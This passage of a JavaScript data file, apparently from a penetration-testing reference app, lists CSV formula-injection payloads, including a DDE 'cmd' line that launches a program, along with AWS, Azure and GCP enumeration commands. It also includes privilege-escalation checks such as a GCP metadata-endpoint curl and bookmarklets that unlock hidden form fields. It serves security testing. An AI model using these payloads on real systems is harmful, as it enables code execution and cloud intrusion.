        payload: "=HYPERLINK(\"javascript:alert('XSS')\",\"Click for XSS\")",
        description: "JavaScript hyperlink that executes when opened"
    },
    {
        payload: ",=2+5+cmd|' /C calc'!A0,",
        description: "CSV formula with command execution disguised as calculation"
    }
];

// AWS Cloud Security CLI Commands
const awsSecurityCliData = [
    {
        command: "aws ec2 describe-security-groups",
        description: "List all security groups and their inbound/outbound rules"
    },
    {
        command: "aws iam list-users",
        description: "List all IAM users in the AWS account"
    },
    {
        command: "aws iam list-roles",
        description: "List all IAM roles in the AWS account"
    },
    {
        command: "aws iam get-account-password-policy",
        description: "Get the account password policy details"
    },
    {
        command: "aws s3api list-buckets",
        description: "List all S3 buckets in the account"
    },
    {
        command: "aws s3api get-bucket-policy --bucket bucket-name",
        description: "View bucket policy for a specific S3 bucket"
    },
    {
        command: "aws s3api get-bucket-acl --bucket bucket-name",
        description: "View bucket ACLs for a specific S3 bucket"
    },
    {
        command: "aws cloudtrail describe-trails",
        description: "List all CloudTrail trails configured"
    },
    {
        command: "aws kms list-keys",
        description: "List all KMS keys in the account"
    },
    {
        command: "aws guardduty list-detectors",
        description: "List GuardDuty detectors for monitoring threats"
    },
    {
        command: "aws config describe-configuration-recorders",
        description: "View AWS Config recorders status for compliance monitoring"
    },
    {
        command: "aws inspector list-assessment-templates",
        description: "List Inspector assessment templates for vulnerability scanning"
    }
];

// Azure Cloud Security CLI Commands
const azureSecurityCliData = [
    {
        command: "az security alert list",
        description: "List security alerts detected by Azure Security Center"
    },
    {
        command: "az network nsg list",
        description: "List all Network Security Groups"
    },
    {
        command: "az network nsg rule list --nsg-name <nsg-name> -g <resource-group>",
        description: "List all rules in a Network Security Group"
    },
    {
        command: "az ad user list",
        description: "List all users in Azure Active Directory"
    },
    {
        command: "az role assignment list",
        description: "List all role assignments in the subscription"
    },
    {
        command: "az keyvault list",
        description: "List all Key Vaults in the subscription"
    },
    {
        command: "az storage account list",
        description: "List all storage accounts in the subscription"
    },
    {
        command: "az storage account show-connection-string --name <storage-name> -g <resource-group>",
        description: "Get connection string for a storage account"
    },
    {
        command: "az monitor activity-log list --start-time <start-time>",
        description: "List activity logs for a specific time period"
    },
    {
        command: "az policy assignment list",
        description: "List all policy assignments in the subscription"
    },
    {
        command: "az vm list",
        description: "List all virtual machines in the subscription"
    },
    {
        command: "az disk list",
        description: "List all managed disks in the subscription"
    }
];

// GCP Cloud Security CLI Commands
const gcpSecurityCliData = [
    {
        command: "gcloud projects get-iam-policy <project-id>",
        description: "List IAM policies for a specific project"
    },
    {
        command: "gcloud compute firewall-rules list",
        description: "List all firewall rules in the project"
    },
    {
        command: "gcloud compute networks list",
        description: "List all VPC networks in the project"
    },
    {
        command: "gcloud compute instances list",
        description: "List all VM instances in the project"
    },
    {
        command: "gcloud storage ls",
        description: "List all storage buckets in the project"
    },
    {
        command: "gcloud storage ls gs://<bucket-name> -r",
        description: "List all objects in a specific bucket recursively"
    },
    {
        command: "gcloud iam service-accounts list",
        description: "List all service accounts in the project"
    },
    {
        command: "gcloud logging logs list",
        description: "List all logs available in Cloud Logging"
    },
    {
        command: "gcloud kms keys list --keyring=<keyring-name> --location=<location>",
        description: "List all keys in a specific keyring"
    },
    {
        command: "gcloud container clusters list",
        description: "List all GKE clusters in the project"
    },
    {
        command: "gcloud sql instances list",
        description: "List all Cloud SQL instances in the project"
    },
    {
        command: "gcloud services list --enabled",
        description: "List all enabled APIs in the project"
    }
];

// Cloud Security Data
const cloudSecurityData = {
    aws: {
        tools: [
            {
                name: "Pacu",
                description: "AWS exploitation framework",
                link: "https://github.com/RhinoSecurityLabs/pacu"
            },
            {
                name: "ScoutSuite",
                description: "Multi-cloud security auditing tool",
                link: "https://github.com/nccgroup/ScoutSuite"
            },
            {
                name: "Prowler",
                description: "AWS CIS Benchmark tool",
                link: "https://github.com/prowler-cloud/prowler"
            },
            {
                name: "S3Scanner",
                description: "S3 bucket scanning",
                link: "https://github.com/sa7mon/S3Scanner"
            },
            {
                name: "CloudSploit",
                description: "Cloud security configuration scanner",
                link: "https://github.com/aquasecurity/cloudsploit"
            }
        ],
        privEscTechniques: [
            {
                misconfiguration: "IAM User Keys",
                description: "Exposed IAM user access keys",
                detectionMethod: "aws iam list-access-keys --user-name [username]"
            },
            {
                misconfiguration: "IAM Role Trust Policies",
                description: "Overly permissive trust relationships",
                detectionMethod: "aws iam list-roles | grep RoleName"
            },
            {
                misconfiguration: "EC2 Instance Profile",
                description: "Over-privileged EC2 instance profiles",
                detectionMethod: "aws iam list-instance-profiles"
            },
            {
                misconfiguration: "S3 Bucket Policies",
                description: "Permissive bucket policies",
                detectionMethod: "aws s3api get-bucket-policy --bucket [bucket-name]"
            },
            {
                misconfiguration: "Lambda Policies",
                description: "Excessive Lambda function permissions",
                detectionMethod: "aws lambda get-policy --function-name [function-name]"
            }
        ],
        cliCommands: awsSecurityCliData
    },
    azure: {
        tools: [
            {
                name: "MicroBurst",
                description: "Azure security assessment toolkit",
                link: "https://github.com/NetSPI/MicroBurst"
            },
            {
                name: "Azure Hunter",
                description: "Azure environment assessment tool",
                link: "https://github.com/darkquasar/AzureHunter" 
            },
            {
                name: "Stormspotter",
                description: "Azure environment visualization",
                link: "https://github.com/Azure/Stormspotter"
            },
            {
                name: "ScoutSuite",
                description: "Multi-cloud security auditing tool",
                link: "https://github.com/nccgroup/ScoutSuite"
            },
            {
                name: "ROADtools",
                description: "Azure AD assessment framework",
                link: "https://github.com/dirkjanm/ROADtools"
            }
        ],
        privEscTechniques: [
            {
                misconfiguration: "Azure AD Roles",
                description: "Over-permissive role assignments",
                detectionMethod: "Get-AzRoleAssignment"
            },
            {
                misconfiguration: "Managed Identities",
                description: "VM with privileged managed identity",
                detectionMethod: "az vm identity show --name [vm-name] --resource-group [resource-group]"
            },
            {
                misconfiguration: "Key Vault Access",
                description: "Excessive Key Vault access policies",
                detectionMethod: "az keyvault show --name [keyvault-name]"
            },
            {
                misconfiguration: "Service Principal Permissions",
                description: "Over-provisioned service principals",
                detectionMethod: "az ad sp list --show-mine"
            },
            {
                misconfiguration: "Storage Account SAS",
                description: "Overly permissive SAS tokens",
                detectionMethod: "az storage account keys list --account-name [name]"
            }
        ],
        cliCommands: azureSecurityCliData
    },
    gcp: {
        tools: [
            {
                name: "GCP Scanner",
                description: "Scanner for GCP resources",
                link: "https://github.com/google/gcp_scanner"
            },
            {
                name: "GCPBucketBrute",
                description: "GCP storage bucket enumeration",
                link: "https://github.com/RhinoSecurityLabs/GCPBucketBrute"
            },
            {
                name: "ScoutSuite",
                description: "Multi-cloud security auditing tool",
                link: "https://github.com/nccgroup/ScoutSuite"
            },
            {
                name: "Forseti Security",
                description: "GCP security monitoring tool",
                link: "https://github.com/forseti-security/forseti-security"
            },
            {
                name: "GCP IAM Recommender",
                description: "Permissions management tool",
                link: "https://cloud.google.com/iam/docs/recommender"
            }
        ],
        privEscTechniques: [
            {
                misconfiguration: "Service Account Roles",
                description: "Over-permissive service account roles",
                detectionMethod: "gcloud projects get-iam-policy [project-id]"
            },
            {
                misconfiguration: "Custom Roles",
                description: "Custom roles with excessive permissions",
                detectionMethod: "gcloud iam roles list --project=[project-id]"
            },
            {
                misconfiguration: "Service Account Keys",
                description: "Exposed service account keys",
                detectionMethod: "gcloud iam service-accounts keys list --iam-account=[account]"
            },
            {
                misconfiguration: "Compute Instance Metadata",
                description: "Access to compute instance metadata",
                detectionMethod: "curl -H \"Metadata-Flavor: Google\" 'http://metadata.google.internal/computeMetadata/v1/instance/'"
            },
            {
                misconfiguration: "Cloud Storage ACLs",
                description: "Permissive bucket ACLs",
                detectionMethod: "gsutil iam get gs://[bucket-name]"
            }        ],
        cliCommands: gcpSecurityCliData
    }
};

// Bookmark Tools data
const bookmarkToolsData = [
    {
        code: "javascript:(function(){document.querySelectorAll('[disabled],[readonly]').forEach(el=>{el.removeAttribute('disabled');el.removeAttribute('readonly');});document.querySelectorAll('[style*=\"display: none\"]').forEach(el=>{el.style.display='block';});document.querySelectorAll('[style*=\"pointer-events: none\"]').forEach(el=>{el.style.pointerEvents='auto';el.style.opacity='1';});alert('Disabled, readonly, and hidden elements are now active!');})();",
        description: "Enable disabled/readonly fields and show hidden elements on web forms",
        name: "Client-Side Bypass"
    },
    {
        code: "javascript:(function(){var scripts=document.getElementsByTagName(\"script\"),regex=/(?<=(\\\"|\%27|\\`))\/[a-zA-Z0-9_?&=\/\-\#\.]*(?=(\\\"|\\'|\%60))/g;const results=new Set;for(var i=0;i<scripts.length;i++){var t=scripts[i].src;\"\"!=t&&fetch(t).then(function(t){return t.text()}).then(function(t){var e=t.matchAll(regex);for(let r of e)results.add(r[0])}).catch(function(t){console.log(\"An error occurred: \",t)})}var pageContent=document.documentElement.outerHTML,matches=pageContent.matchAll(regex);for(const match of matches)results.add(match[0]);function writeResults(){results.forEach(function(t){document.write(t+\"<br>\")})}setTimeout(writeResults,3e3);})();",
        description: "Extracts potential API endpoints from scripts and page content",
        name: "Endpoint Grabber"
    }
];
